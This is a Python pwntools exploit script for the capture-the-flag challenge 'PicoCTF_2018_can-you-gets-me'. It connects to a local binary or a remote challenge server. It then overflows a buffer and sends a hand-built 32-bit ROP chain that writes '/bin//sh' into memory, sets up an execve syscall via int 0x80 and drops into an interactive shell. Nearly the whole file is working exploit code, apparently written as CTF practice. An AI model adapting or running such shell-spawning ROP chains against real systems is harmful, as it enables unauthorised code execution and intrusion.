import sys
from pwn import *
from struct import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./PicoCTF_2018_can-you-gets-me')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./PicoCTF_2018_can-you-gets-me')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26611)
			elf=ELF('./PicoCTF_2018_can-you-gets-me')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		p = 'a'*0x1c

		p += pack('<I', 0x0806f02a) # pop edx ; ret
		p += pack('<I', 0x080ea060) # @ .data
		p += pack('<I', 0x080b81c6) # pop eax ; ret
		p += '/bin'
		p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
		p += pack('<I', 0x0806f02a) # pop edx ; ret
		p += pack('<I', 0x080ea064) # @ .data + 4
		p += pack('<I', 0x080b81c6) # pop eax ; ret
		p += '//sh'
		p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
		p += pack('<I', 0x0806f02a) # pop edx ; ret
		p += pack('<I', 0x080ea068) # @ .data + 8
		p += pack('<I', 0x08049303) # xor eax, eax ; ret
		p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
		p += pack('<I', 0x080481c9) # pop ebx ; ret
		p += pack('<I', 0x080ea060) # @ .data
		p += pack('<I', 0x080de955) # pop ecx ; ret
		p += pack('<I', 0x080ea068) # @ .data + 8
		p += pack('<I', 0x0806f02a) # pop edx ; ret
		p += pack('<I', 0x080ea068) # @ .data + 8
		p += pack('<I', 0x08049303) # xor eax, eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0807a86f) # inc eax ; ret
		p += pack('<I', 0x0806cc25) # int 0x80
		io.recv()
		io.sendline(p)

			


		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue